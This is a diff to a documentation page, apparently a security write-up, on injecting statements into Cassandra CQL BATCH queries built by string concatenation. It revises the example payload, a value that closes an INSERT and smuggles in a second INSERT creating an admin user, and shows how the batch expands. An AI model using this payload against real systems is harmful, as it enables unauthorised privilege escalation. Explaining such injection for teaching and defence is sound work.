@@ -34,25 +34,18 @@ session.execute(cql)
 An `item` value of:
 
 ```sql
-x'); INSERT INTO users (id, role) VALUES ('attacker','admin'); //
+x'); INSERT INTO users (id, role) VALUES ('attacker','admin') //
 ```
 
-is not quite right for CQL (no `//` line comment), so the reliable form closes the current statement and opens a chosen one, letting the template's own `APPLY BATCH` terminate the block:
-
-```sql
-x'); INSERT INTO users (id,role) VALUES ('attacker','admin')
-```
-
-which expands to:
+closes the current `INSERT`, adds a chosen one, and ends with a `//` line comment (CQL also accepts `--` and `/* */`) to swallow the `')` the template still appends. It expands to:
 
 ```sql
 BEGIN BATCH
-INSERT INTO cart (user, sku) VALUES ('alice','x');
-INSERT INTO users (id,role) VALUES ('attacker','admin');
+INSERT INTO cart (user, sku) VALUES ('alice','x'); INSERT INTO users (id,role) VALUES ('attacker','admin') //');
 APPLY BATCH;
 ```
 
-The smuggled `INSERT` writes an admin row. Because statements inside a batch are separated by `;` and the whole block is one driver statement, this works where standalone stacked queries do not.
+The comment discards the leftover `');`, the smuggled `INSERT` writes an admin row, and the template's own `APPLY BATCH` terminates the block. Because statements inside a batch are separated by `;` and the whole block is one driver statement, this works where standalone stacked queries do not.
 
 ## Forming a batch from a single write
 
